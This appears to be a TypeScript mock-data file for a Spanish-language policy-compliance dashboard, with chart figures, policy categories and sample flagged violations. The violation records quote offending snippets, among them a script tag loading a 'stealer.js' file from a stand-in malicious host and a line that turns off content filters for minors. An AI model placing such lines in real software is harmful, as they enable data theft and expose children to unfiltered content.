import { ChartDataItem, RiskDataItem, Policy, Violation } from './types';

export const CHART_DATA: ChartDataItem[] = [
    { name: 'Ene', violaciones: 12, escaneos: 120 },
    { name: 'Feb', violaciones: 18, escaneos: 150 },
    { name: 'Mar', violaciones: 15, escaneos: 140 },
    { name: 'Abr', violaciones: 22, escaneos: 180 },
    { name: 'May', violaciones: 30, escaneos: 210 },
    { name: 'Jun', violaciones: 25, escaneos: 190 },
    { name: 'Jul', violaciones: 35, escaneos: 240 },
    { name: 'Ago', violaciones: 40, escaneos: 280 },
    { name: 'Sep', violaciones: 38, escaneos: 260 },
    { name: 'Oct', violaciones: 45, escaneos: 310 },
    { name: 'Nov', violaciones: 50, escaneos: 340 },
    { name: 'Dic', violaciones: 48, escaneos: 320 },
];

export const RISK_DATA: RiskDataItem[] = [
    { name: 'Crítico', value: 400, color: '#ef4444' },
    { name: 'Alto', value: 300, color: '#f97316' },
    { name: 'Medio', value: 300, color: '#facc15' },
    { name: 'Bajo', value: 200, color: '#3b82f6' },
];

export const POLICIES: Policy[] = [
    {
        name: "Malware, phishing o suplantación de identidad",
        description: "Contenido que intenta engañar a los usuarios para que compartan información confidencial o descarguen software malicioso."
    },
    {
        name: "Suplantación de identidad",
        description: "Contenido que se hace pasar por otra persona o entidad para engañar a los usuarios o causar daño."
    },
    {
        name: "Imágenes de abuso sexual infantil (CSAM)",
        description: "Cualquier contenido que represente o promueva el abuso sexual infantil. Tolerancia cero."
    },
    {
        name: "Acoso",
        description: "Contenido que promueve el acoso, la intimidación o el abuso de individuos o grupos."
    },
    {
        name: "Discurso de odio",
        description: "Contenido que promueve la violencia, incita al odio o discrimina por motivos de raza, religión, género, etc."
    },
    {
        name: "Trata de personas",
        description: "Contenido que facilita o promueve la explotación humana o el tráfico de personas."
    },
    {
        name: "Contenido sexualmente explícito",
        description: "Contenido que contiene desnudez o actos sexuales explícitos no educativos ni artísticos."
    },
    {
        name: "Violencia y sangre",
        description: "Contenido extremadamente violento o gráfico que no tiene un propósito informativo o documental."
    },
    {
        name: "Políticas dañinas o peligrosas",
        description: "Contenido que promueve actividades ilegales o peligrosas que pueden causar daño físico grave."
    }
];

export const INITIAL_VIOLATIONS: Violation[] = [
    {
        id: 'APP-882',
        name: 'NeuralGen Pro',
        policy: 'Contenido sexualmente explícito',
        status: 'Marcada',
        risk: 'Alto',
        date: '2026-02-22',
        year: 2026,
        month: 'Febrero',
        area: 'Generación de Contenido',
        details: {
            location: 'src/components/ImageGenerator.tsx:142',
            snippet: 'const generatePrompt = (input) => { return `NSFW ${input}`; };',
            explanation: 'El sistema detectó un prefijo que fuerza la generación de contenido no apto para todo público.'
        }
    },
    {
        id: 'APP-441',
        name: 'ChatBot-X',
        policy: 'Discurso de odio',
        status: 'En Revisión',
        risk: 'Medio',
        date: '2026-02-21',
        year: 2026,
        month: 'Febrero',
        area: 'Comunicación',
        details: {
            location: 'src/api/chat.ts:88',
            snippet: 'if (user.isMinor) { allowUnfilteredChat = true; }',
            explanation: 'Se detectó una lógica que desactiva los filtros de seguridad para usuarios menores de edad.'
        }
    },
    {
        id: 'APP-102',
        name: 'EasyScraper',
        policy: 'Malware, phishing o suplantación de identidad',
        status: 'Prohibida',
        risk: 'Crítico',
        date: '2026-01-20',
        year: 2026,
        month: 'Enero',
        area: 'Herramientas de Datos',
        details: {
            location: 'public/index.html:12',
            snippet: '<script src="https://evil-cdn.com/stealer.js"></script>',
            explanation: 'Inyección de script externo malicioso detectada en el punto de entrada de la aplicación.'
        }
    },
    {
        id: 'APP-993',
        name: 'SocialConnect',
        policy: 'Acoso',
        status: 'Resuelta',
        risk: 'Bajo',
        date: '2025-12-19',
        year: 2025,
        month: 'Diciembre',
        area: 'Redes Sociales',
        details: {
            location: 'src/utils/notifications.ts:45',
            snippet: 'sendSpam(user.contacts);',
            explanation: 'Función que permite el envío masivo de mensajes no solicitados a contactos del usuario.'
        }
    },
    {
        id: 'APP-555',
        name: 'DeepFake Studio',
        policy: 'Suplantación de identidad',
        status: 'Apelación',
        risk: 'Alto',
        date: '2025-11-18',
        year: 2025,
        month: 'Noviembre',
        area: 'Multimedia',
        details: {
            location: 'src/utils/face_swap.py:22',
            snippet: 'def swap_identity(target, source): ...',
            explanation: 'Modelo de IA optimizado para la creación de deepfakes sin marcas de agua de seguridad.'
        }
    },
];
